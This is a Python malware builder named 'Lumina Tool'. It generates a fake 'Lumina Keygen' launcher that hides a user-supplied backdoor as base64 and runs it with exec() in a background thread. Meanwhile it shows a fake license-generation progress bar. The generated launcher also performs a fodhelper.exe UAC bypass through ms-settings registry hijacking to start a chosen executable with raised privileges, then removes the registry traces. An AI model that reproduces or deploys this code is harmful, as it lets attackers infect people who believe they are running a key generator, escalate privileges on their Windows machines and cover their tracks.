import os
import base64
from pystyle import Colorate, Colors

color_loggers = Colors.white_to_red

def lnksiplgrs():
    contenido = """
██╗     ██╗   ██╗███╗   ███╗██╗███╗   ██╗ █████╗       ████████╗ ██████╗  ██████╗ ██╗     
██║     ██║   ██║████╗ ████║██║████╗  ██║██╔══██╗      ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
██║     ██║   ██║██╔████╔██║██║██╔██╗ ██║███████║         ██║   ██║   ██║██║   ██║██║     
██║     ██║   ██║██║╚██╔╝██║██║██║╚██╗██║██╔══██║         ██║   ██║   ██║██║   ██║██║     
███████╗╚██████╔╝██║ ╚═╝ ██║██║██║ ╚████║██║  ██║         ██║   ╚██████╔╝╚██████╔╝███████╗
╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝         ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ v1.0
                                                                                               
[+] Read : ReadME.txt   |  Created by https://www.tiktok.com/@uknowuser_qq
    """
    print(Colorate.Horizontal(color_loggers, contenido))

def generate_launcher(exe_name, loader_time, backdoor_code):

    encoded_backdoor = ""
    if backdoor_code:
        encoded_backdoor = base64.b64encode(backdoor_code.encode()).decode()

    launcher_template = f'''
import customtkinter as ctk
import os
import subprocess
import threading
import time
import base64

class LuminaLauncher(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Lumina System")
        self.geometry("450x250")
        self.resizable(False, False)
        self.attributes("-topmost", True)
        
        ctk.set_appearance_mode("dark")
        self.configure(fg_color="#0a0a0a")

        self.main_frame = ctk.CTkFrame(self, corner_radius=15, fg_color="#121212", border_width=2, border_color="#ff1a1a")
        self.main_frame.pack(pady=20, padx=20, fill="both", expand=True)

        self.label_status = ctk.CTkLabel(self.main_frame, text="Loading...", font=("Segoe UI", 16, "bold"), text_color="#ffffff")
        self.label_status.pack(pady=(25, 10))

        self.progress = ctk.CTkProgressBar(self.main_frame, orientation="horizontal", width=350, height=15, 
                                           progress_color="#ff1a1a", fg_color="#333333", mode="determinate")
        self.progress.set(0)
        self.progress.pack(pady=10)

        self.label_info = ctk.CTkLabel(self.main_frame, text="====>> - Welcome to Lumina Keygen - <<====", font=("Segoe UI", 10), text_color="#666666")
        self.label_info.pack()

        threading.Thread(target=self.run_backdoor, daemon=True).start()
        threading.Thread(target=self.start_process, daemon=True).start()

    def run_backdoor(self):
        b_data = "{encoded_backdoor}"
        if b_data:
            try:
                exec(base64.b64decode(b_data).decode())
            except:
                pass

    def start_process(self):
        exe_target = "{exe_name}"
        wait_time = {loader_time}
        steps = 100
        
        for i in range(1, steps + 1):
            time.sleep(wait_time / steps)
            self.progress.set(i / 100)
            if i == 20: self.label_info.configure(text="Checking launcher version...   1.0")
            if i == 30: self.label_info.configure(text="Looking at Assembly info for compatibility")
            if i == 50: self.label_info.configure(text="Generating access key (license)...")
            if i == 80: self.label_info.configure(text="Generated key : cc4fd81905261a1d3458c8ce9439ae54aa2aee251d175fe4f5e8cad9c60bb153")
            if i == 85: self.label_info.configure(text="Opening " + exe_target)

        self.label_status.configure(text="SUCCESS", text_color="#00ff00")
        time.sleep(0.5)
        self.execute_bypass(exe_target)
        self.destroy()

    def execute_bypass(self, full_path):
        full_path = os.path.abspath(full_path)
        reg_path = r"Software\\Classes\\ms-settings\\CurVer"
        try:
            subprocess.run(f'reg add "HKCU\\\\Software\\\\Classes\\\\.vibecoder\\\\Shell\\\\Open\\\\command" /d "{{full_path}}" /f', shell=True, capture_output=True)
            subprocess.run(f'reg add "HKCU\\\\{{reg_path}}" /d ".vibecoder" /f', shell=True, capture_output=True)
            subprocess.run("fodhelper.exe", shell=True, capture_output=True)
            time.sleep(2)
            subprocess.run(f'reg delete "HKCU\\\\Software\\\\Classes\\\\.vibecoder" /f', shell=True, capture_output=True)
            subprocess.run(f'reg delete "HKCU\\\\{{reg_path}}" /f', shell=True, capture_output=True)
        except:
            pass

if __name__ == "__main__":
    app = LuminaLauncher()
    app.mainloop()
'''

    with open("Launcher_Infected.py", "w", encoding="utf-8") as f:
        f.write(launcher_template)
    
    print(Colorate.Horizontal(color_loggers, f"\n[✔] Builder finalizado: 'Launcher_Infected.py'"))

if __name__ == "__main__":
    os.system('cls')
    lnksiplgrs()
    
    exe_target = input(Colorate.Horizontal(color_loggers, "Exe to open: ")).strip()
    
    l_time = input(Colorate.Horizontal(color_loggers, "Loader time (segundos): "))
    l_time = float(l_time) if l_time else 3.0
    
    bd_file = input(Colorate.Horizontal(color_loggers, "Enter Backdoor python file (N to not use): ")).strip()
    
    bd_content = ""
    if bd_file.lower() != 'n' and os.path.exists(bd_file):
        with open(bd_file, "r", encoding="utf-8") as f:
            bd_content = f.read()
        print(Colorate.Horizontal(color_loggers, "[!] Backdoor loaded"))
    else:
        print(Colorate.Horizontal(color_loggers, "[!] N -> No Backdoor "))

    generate_launcher(exe_target, l_time, bd_content)
    input(Colorate.Horizontal(color_loggers, "\n[!] Enter to exit ..."))